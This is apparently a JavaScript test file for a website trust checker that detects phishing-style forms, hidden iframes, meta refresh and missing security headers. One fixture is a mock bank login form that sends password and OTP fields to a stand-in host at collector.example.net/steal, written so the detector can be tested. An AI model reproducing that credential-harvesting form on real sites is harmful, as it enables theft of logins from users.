import assert from 'node:assert/strict';
import { test } from 'node:test';
import { analyzeHeaders } from '../src/health/headers.js';
import { analyzePage } from '../src/trust/pageSignals.js';

test('detects a password form that posts to another domain', () => {
  const html = `<html><head><title>Bank login</title></head><body>
    <form action="https://collector.example.net/steal"><input type="password" name="pw"><input name="otp"></form>
    <a href="/about">About</a><a href="/x">x</a><a href="/y">y</a></body></html>`;
  const page = analyzePage({ html, finalUrl: 'https://my-bank.example.com/login' });
  assert.equal(page.hasSensitiveForm, true);
  assert.ok(page.sensitiveFields.includes('password'));
  assert.ok(page.sensitiveFields.includes('OTP'));
  assert.deepEqual(page.formsToOtherDomains, ['collector.example.net']);
  assert.equal(page.insecureSensitive, false);
  assert.equal(page.title, 'Bank login');
});

test('flags sensitive forms on plain HTTP pages', () => {
  const html = '<form><input name="cardnumber"></form>';
  assert.equal(analyzePage({ html, finalUrl: 'http://shop.example.com/' }).insecureSensitive, true);
});

test('finds contact and privacy links, hidden iframes and meta refresh', () => {
  const html = `<html><head><meta http-equiv="refresh" content="0; url=https://other.example.org/"></head><body>
    <a href="/contact-us">Contact</a><a href="/privacy">Privacy policy</a><a href="/">Home</a>
    <iframe src="https://ads.example.net" width="0" height="0"></iframe></body></html>`;
  const page = analyzePage({ html, finalUrl: 'https://example.com/' });
  assert.equal(page.hasContact, true);
  assert.equal(page.hasPrivacy, true);
  assert.equal(page.hiddenIframes, 1);
  assert.equal(page.metaRefresh.crossDomain, true);
});

test('security header score', () => {
  const headers = new Headers({
    'strict-transport-security': 'max-age=31536000',
    'content-security-policy': "default-src 'self'; frame-ancestors 'none'",
    'x-content-type-options': 'nosniff',
  });
  const result = analyzeHeaders(headers, 'https:');
  assert.equal(result.items.find((i) => i.id === 'hsts').present, true);
  assert.equal(result.items.find((i) => i.id === 'frame').present, true); // via frame-ancestors
  assert.equal(result.items.find((i) => i.id === 'referrer').present, false);
  assert.equal(result.score, 67);
  assert.equal(analyzeHeaders(headers, 'http:').items.find((i) => i.id === 'hsts').present, false);
});
